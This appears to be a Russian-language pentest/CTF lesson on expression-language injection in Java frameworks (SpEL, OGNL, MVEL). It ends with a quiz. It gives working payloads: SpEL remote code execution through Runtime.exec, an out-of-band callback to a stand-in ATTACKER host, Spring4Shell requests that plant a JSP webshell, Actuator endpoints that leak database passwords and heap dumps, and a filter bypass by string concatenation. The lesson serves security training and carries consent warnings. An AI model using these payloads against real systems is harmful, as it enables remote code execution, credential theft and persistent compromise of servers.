---
id: web-el-ognl-injection
title: "Expression Language и OGNL-инъекции (SpEL, OGNL, MVEL)"
category: web
parent: web-ssti-core
difficulty: hard
order: 2
tags: [spel, ognl, mvel, spring, struts, rce]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Инъекции в expression language Java: SpEL, OGNL, MVEL — от вычисления выражений до RCE (Spring4Shell, Struts2)."
---

## Вопрос, с которого всё начинается

На прошлых уроках мы заставляли выполняться шаблонизатор и XML-процессор. У Java-фреймворков есть ещё один «исполнитель» — **язык выражений** (Expression Language, EL). Его используют, чтобы в конфиге или в аннотации написать не значение, а **выражение**, которое фреймворк вычислит: `@Value("#{...}")`, правило авторизации, параметр сортировки.

Вопрос: что, если твой параметр из запроса попадёт внутрь такого выражения? Тогда фреймворк выполнит твой код — а язык выражений умеет вызывать методы и обращаться к классам. Это класс инъекций, породивший Spring4Shell и десяток RCE в Struts2.

## Наш пример

Есть Spring Boot API интернет-магазина `app.example`. У списка товаров есть параметр сортировки:

```bash
$ curl -s 'https://app.example/api/items?sort=price'
{"sortedBy":"price","items":[{"id":1,"price":100}, ...]}
```

Параметр `sort` подставляется в имя поля для сортировки. Проверим гипотезу, что он попадает в **SpEL** (Spring Expression Language — язык выражений Spring). Выражение в SpEL пишут как `#{...}`. Отправим арифметику:

```bash
$ curl -s 'https://app.example/api/items?sort=%23%7B7*7%7D'
{"sortedBy":"49","items":[...]}
```

`%23%7B7*7%7D` — это URL-кодирование строки `#{7*7}`. Сервер вернул `sortedBy":"49"` — значит, он **вычислил** наше выражение. Это EL-инъекция: наш ввод стал кодом.

## Шаг 1: проверяем, доступны ли классы

Прежде чем строить вызов команды, убедимся, что SpEL работает в «полном» режиме и нам доступны Java-классы через оператор `T(...)`:

```bash
$ curl -s 'https://app.example/api/items?sort=%23%7BT(java.lang.Math).random()%7D'
{"sortedBy":"0.7281...","items":[...]}
```

`T(java.lang.Math).random()` вернул случайное число — классы доступны. Если бы вернулась ошибка вида `SpelEvaluationException`, режим был бы ограничен (`SimpleEvaluationContext`), и `T()`/`new` не работали бы.

## Шаг 2: выполняем команду

Теперь дёрнем `java.lang.Runtime` — класс, который запускает процессы ОС:

```bash
$ curl -s 'https://app.example/api/items' -G --data-urlencode \
  'sort=#{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream(), T(java.nio.charset.StandardCharsets).UTF_8)}'
{"sortedBy":"uid=0(root) gid=0(root) groups=0(root)","items":[...]}
```

Разберём по частям. `getRuntime().exec(...)` запускает процесс, но **не показывает вывод** — он возвращает объект процесса. Чтобы получить текст, мы читаем поток процесса через `StreamUtils.copyToString(...)` и превращаем байты в строку с кодировкой UTF-8. Именно поэтому многие первые попытки «работают, но пусто»: вывод нужно явно считать из `getInputStream()`.

`uid=0(root)` — команда выполнена от root. Артефакт получен.

## Шаг 3: если вывод не видно

Если ответ пустой, используй **OOB** — заставь сервер постучаться к тебе:

```bash
$ nc -lvnp 4444
# на цели:
$ curl -s 'https://app.example/api/items' -G --data-urlencode \
  'sort=#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","curl http://ATTACKER:4444/x"})}'
```

Пришёл запрос — код выполнился. Ещё вариант — reverse shell, но помни: это уже полноценное вторжение, только с согласия.

## Шаг 4: какой это движок

Java-приложений много, и у каждого свой синтаксис. Таблица для фингерпринта:

| Движок | Синтаксис | Где встречается |
|--------|-----------|-----------------|
| SpEL | `#{...}`, `${...}` | Spring, Cloud Gateway, Data |
| OGNL | `%{...}` | Struts2, MyBatis |
| MVEL | `${...}`, `@{...}` | JBoss, Drools |
| JEXL | `${...}` | Apache Commons JEXL |

Если `#{7*7}` не вычислилось, а `%{7*7}` — да, у тебя **OGNL** (движок Struts2). Для Struts2 есть готовые эксплойты (`struts-pwn`, модули Metasploit) под конкретные CVE — S2-045/046/048/052/057. Не пиши OGNL-цепочку вручную: она огромная и версионно-зависимая.

## Шаг 5: Actuator как усилитель

Spring Boot по умолчанию (или по недосмотру) открывает `/actuator/*` — служебные эндпоинты. Они дают и утечки, и дополнительные точки инъекции:

```bash
$ curl -s https://app.example/actuator/env | jq '.propertySources[].properties | keys' | head
["spring.datasource.password", "spring.datasource.url", ...]
$ curl -s https://app.example/actuator/gateway/routes | jq .
```

- `/actuator/env` — переменные окружения: пароли БД, ключи, токены.
- `/actuator/gateway/routes` — Spring Cloud Gateway: маршрут со SpEL-фильтром даёт RCE (CVE-2022-22947).
- `/actuator/heapdump` — дамп памяти с секретами.
- `/actuator/jolokia` — операции JMX, часто → RCE.

Проверь, какие эндпоинты открыты: если в конфиге `management.endpoints.web.exposure.include=*`, поверхность огромна.

## Шаг 6: версия и CVE

EL-инъекции привязаны к версиям, поэтому точное определение версии — ключ к payload. Признаки Spring: заголовок `X-Application-Context`, страница ошибок Whitelabel, cookie `JSESSIONID`, `/actuator/*`. Признаки Struts2: пути `.action`, ошибки `com.opensymphony.xwork2`.

| Признак | Версия | CVE |
|---------|--------|-----|
| Spring MVC, JDK9+, Tomcat, WAR | < 5.3.18 / 5.2.20 | CVE-2022-22965 (Spring4Shell) |
| Spring Cloud Gateway Actuator | < 3.1.0 | CVE-2022-22947 |
| Struts2 multipart | 2.3.5–2.3.31 | CVE-2017-5638 (S2-045) |

Скачанный PoC — **недоверенный код**: прочитай его, переведи колбэки на себя, оцени, не уронит ли он цель (у Struts2 есть DoS-варианты).

## Шаг 7: Spring4Shell — когда инъекция без явного `#{}`

Самая громкая EL-уязвимость Spring — **CVE-2022-22965** (Spring4Shell) — выглядит иначе, чем `#{...}` в параметре. Здесь атакуют механизм **биндинга данных**: Spring автоматически заполняет объект из параметров запроса (`user.name=...` → `user.setName(...)`). Через специальные пути вроде `class.module.classLoader.*` атакующий добирается до внутренних свойств Tomcat и меняет конфигурацию логгера так, что тот начинает писать в webroot файл с расширением `.jsp` — то есть webshell.

Условия: JDK 9+, Tomcat, Spring MVC версии ниже 5.3.18/5.2.20, приложение упаковано как WAR. Порядок проверки:

```bash
# 1) параметрами меняем шаблон логгера на запись JSP
$ curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20...jsp..."
# 2) выставляем суффикс .jsp
$ curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
# 3) обращаемся к созданному webshell
$ curl -s "https://app.example/shell.jsp?cmd=id"
```

Это не «выражение в параметре», а злоупотребление биндингом, но относится к тому же классу. Определять версию Spring помогают заголовок `X-Application-Context`, страница ошибок Whitelabel и наличие `/actuator/*`. Готовые PoC есть в публичных репозиториях — но скачанный PoC это недоверенный код: прочитай его, переведи колбэки на себя и оцени, не уронит ли он цель.

## Что мы теперь знаем

- EL-инъекция — когда твой параметр становится **выражением** и вычисляется.
- Подтверждение — `#{7*7}` → `49`; движок определяют по синтаксису (`#{...}` SpEL, `%{...}` OGNL).
- `T(...)` проверяет доступ к классам; `SimpleEvaluationContext` его блокирует.
- `Runtime.exec` запускает команду, но вывод надо читать через `StreamUtils`.
- Actuator-эндпоинты усиливают атаку и дают секреты.
- Артефакт — вывод `id` или OOB-запрос, а не «выражение посчиталось».

## На что смотреть дальше

- **Не путай движки.** SpEL и OGNL — разные payload; сначала определи, какой перед тобой.
- **Простой контекст.** Если `T()`/`new` недоступны, ищи пути к `StandardEvaluationContext` (часто через `@PreAuthorize`, `@Value`, Actuator).
- **Фильтр по `T(`/`Runtime`** обходится строковой сборкой: `T(java.lang.Class).forName('java.lang.Ru'+'ntime')`.
- **Blind — норма.** Часто вывод не отражается; используй OOB/reverse shell, затем read-back `id`.
- **Версия решает.** Spring4Shell и Struts2-CVE выбираются по точной версии фреймворка.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Какой язык выражений использует Spring?"
  options:
    - "OGNL"
    - "SpEL"
    - "MVEL"
    - "JEXL"
  answer: 1
  explanation: "Spring Expression Language, синтаксис `#{...}`."
- question: "Как в SpEL обратиться к классу?"
  options:
    - "@java.lang.Runtime@"
    - "T(java.lang.Runtime)"
    - "class Runtime"
    - "new Runtime"
  answer: 1
  explanation: "Оператор T(...) даёт доступ к классу."
- question: 'Ответ `{"sortedBy":"49"}` на `sort=#{7*7}` означает:'
  options:
    - "Ошибку сортировки"
    - "Параметр попал в SpEL и был вычислен — инъекция"
    - "XSS"
    - "Нормальную работу"
  answer: 1
  explanation: "Выражение вычислено сервером — это EL-инъекция."
- question: "Почему `Runtime.exec('id')` часто не показывает вывод?"
  options:
    - "Он шифрует результат"
    - "Нужно прочитать поток процесса через getInputStream()"
    - "Он выполняется на клиенте"
    - "Он всегда падает"
  answer: 1
  explanation: "exec возвращает объект процесса; вывод надо явно считать."
- question: "Какой фреймворк связан с OGNL и CVE-2017-5638?"
  options:
    - "Spring"
    - "Struts2"
    - "JSF"
    - "Play"
  answer: 1
  explanation: "Struts2 использует OGNL; S2-045 — OGNL-инъекция в Content-Type."
```

## Куда дальше

Дальше мы возьмём самый громкий пример EL-инъекции в связке с библиотекой логирования — **Log4Shell** (`web-log4shell-jndi`), где строка из поля ввода приводит к загрузке кода через JNDI. А пока главное запомни: если твой параметр **вычислился как выражение** — у тебя EL-инъекция, и путь к RCE обычно короткий.

## Где пригодится

- **CTF (Web):** задачи на Spring/Struts.
- **Bug bounty:** EL-инъекции — критичный RCE-отчёт.
- **Пентест:** аудит Java-приложений и N-day.
- **Работа (AppSec):** не передавать ввод в evaluator, обновлять Spring/Struts, sandbox.
